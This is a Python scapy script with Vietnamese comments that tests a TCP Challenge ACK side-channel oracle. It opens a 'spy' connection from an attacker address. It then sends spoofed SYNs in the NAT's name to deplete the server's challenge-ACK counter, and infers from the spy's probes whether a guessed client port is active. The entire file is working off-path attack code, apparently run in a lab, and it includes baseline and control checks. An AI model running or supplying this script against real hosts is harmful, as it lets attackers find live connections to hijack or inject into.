#!/usr/bin/env python3
"""
oracle_test.py — Test Challenge ACK oracle cho 1 port cụ thể
Chạy: sudo python3 oracle_test.py
"""
from scapy.all import IP, TCP, send, sr1, sniff, AsyncSniffer
import time, random, sys

ATTACKER_IP = "2.2.2.20"
SERVER_IP   = "1.1.1.10"
SERVER_PORT = 8080
NAT_IP      = "1.1.1.1"
SPY_PORT    = random.randint(50000, 59999)
IFACE       = "ens33"

# ═══ STEP 1: Setup spy ═══
print("=" * 50)
print("  ORACLE TEST")
print("=" * 50)

isn = random.randint(1000, 50000)
syn = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S", seq=isn)
resp = sr1(syn, iface=IFACE, timeout=3, verbose=False)
if resp is None or not (resp[TCP].flags & 0x12):
    print("[!] Spy SYN-ACK fail!")
    sys.exit(1)

spy_seq = isn + 1
spy_ack = resp[TCP].seq + 1
ack = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="A", seq=spy_seq, ack=spy_ack)
send(ack, iface=IFACE, verbose=False)
print(f"[✓] Spy OK (seq={spy_seq}, ack={spy_ack})")

# ═══ STEP 2: Baseline probe (counter full) ═══
time.sleep(1.5)  # Đợi counter refill
print("\n[TEST A] Baseline — probe khi counter ĐẦY:")
bpf = f"src host {SERVER_IP} and src port {SERVER_PORT} and dst host {ATTACKER_IP} and dst port {SPY_PORT}"
sniffer = AsyncSniffer(iface=IFACE, count=1, timeout=1.0, filter=bpf)
sniffer.start()
time.sleep(0.05)
probe = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S", seq=spy_seq + 999999)
send(probe, iface=IFACE, verbose=False)
sniffer.join()
if sniffer.results:
    print(f"    → Challenge ACK nhận được ✓ (ĐÚNG — counter đầy)")
else:
    print(f"    → KHÔNG nhận ACK ✗ (SAI — spy có vấn đề)")
    sys.exit(1)

# ═══ STEP 3: Nhập port cần test ═══
test_port = input("\nNhập port client đang active (từ ss output, vd 40004): ").strip()
if not test_port:
    test_port = "40004"
test_port = int(test_port)

# ═══ STEP 4: Deplete counter với spoofed SYNs ═══
time.sleep(1.5)  # Đợi counter reset
print(f"\n[TEST B] Gửi 5 SYN spoofed (10ms spacing) → {NAT_IP}:{test_port} → {SERVER_IP}:{SERVER_PORT}")
# inter=0.01 (10ms) vượt qua per-socket rate limit của kernel 5.15+
pkts = [IP(src=NAT_IP, dst=SERVER_IP) /
        TCP(sport=test_port, dport=SERVER_PORT, flags="S",
            seq=random.randint(0, 2**32-1))
        for _ in range(5)]
send(pkts, iface=IFACE, verbose=False, inter=0.01)

# Probe NGAY
time.sleep(0.02)
print("[TEST B] Probe spy NGAY sau flood:")
sniffer2 = AsyncSniffer(iface=IFACE, count=1, timeout=1.0, filter=bpf)
sniffer2.start()
time.sleep(0.02)
probe2 = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S", seq=spy_seq + 888888)
send(probe2, iface=IFACE, verbose=False)
sniffer2.join()
if sniffer2.results:
    print(f"    → Challenge ACK VẪN nhận được (counter CHƯA cạn!)")
    print(f"    → Port {test_port} có thể KHÔNG active, hoặc SYN không match")
else:
    print(f"    → KHÔNG nhận ACK ✓ (counter ĐÃ cạn!)")
    print(f"    → Port {test_port} CONFIRMED ACTIVE!")

# ═══ STEP 5: Test port CHẮC CHẮN không active ═══
time.sleep(1.5)
fake_port = 39999
print(f"\n[TEST C] Control test — port {fake_port} (chắc chắn KHÔNG active):")
pkts2 = [IP(src=NAT_IP, dst=SERVER_IP) /
         TCP(sport=fake_port, dport=SERVER_PORT, flags="S",
             seq=random.randint(0, 2**32-1))
         for _ in range(20)]
send(pkts2, iface=IFACE, verbose=False, inter=0)

time.sleep(0.02)
sniffer3 = AsyncSniffer(iface=IFACE, count=1, timeout=1.0, filter=bpf)
sniffer3.start()
time.sleep(0.02)
probe3 = IP(src=ATTACKER_IP, dst=SERVER_IP) / TCP(sport=SPY_PORT, dport=SERVER_PORT, flags="S", seq=spy_seq + 777777)
send(probe3, iface=IFACE, verbose=False)
sniffer3.join()
if sniffer3.results:
    print(f"    → Challenge ACK nhận được ✓ (ĐÚNG — port giả không cạn counter)")
else:
    print(f"    → KHÔNG nhận ACK ✗ (SAI — counter bị cạn bởi lý do khác)")

print("\n" + "=" * 50)
print("  KẾT LUẬN:")
print("  - TEST A pass + TEST B pass + TEST C pass = Oracle HOẠT ĐỘNG!")
print("  - TEST B fail = Spoofed SYN không trigger Challenge ACK")
print("=" * 50)
